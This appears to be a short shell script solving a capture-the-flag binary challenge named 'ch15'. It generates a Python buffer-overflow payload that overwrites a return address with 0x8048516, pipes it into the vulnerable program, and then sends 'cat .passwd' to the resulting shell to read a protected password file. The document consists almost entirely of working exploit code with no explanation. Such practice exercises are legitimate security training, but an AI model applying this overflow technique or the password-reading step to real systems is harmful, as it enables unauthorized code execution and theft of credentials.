# ssh ... < commands.sh

f=$(mktemp)
chmod g+r $f
cat << 'EOF' > $f
import struct
import sys

s = bytearray(b'V' * 128)
s += struct.pack('<Q', 0x8048516)

sys.stdout.buffer.write(s)
EOF

(python3 $f; echo; cat <<< 'cat .passwd') | ./ch15